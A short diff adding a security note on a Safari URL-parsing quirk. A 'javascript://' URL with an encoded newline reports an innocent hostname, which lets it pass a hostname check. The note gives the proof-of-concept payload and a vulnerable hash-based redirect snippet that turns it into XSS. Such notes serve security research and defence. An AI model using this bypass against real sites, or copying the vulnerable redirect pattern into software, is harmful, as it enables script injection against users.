@@ -1,0 +1,9 @@
+In Safari, "new URL('javascript://test.com/%0aalert(1)').hostname" will be "test[.]com" (no [] obvi). This can be used to bypass hostname checks and execute valid JS. 
+
+
+Example scenario:
+var u = window.location.hash.substring(1);
+if (new URL(u).hostname === location.hostname) 
+    window.location.href = u;
+
+If you put the above URL in the hash, this will result in XSS.
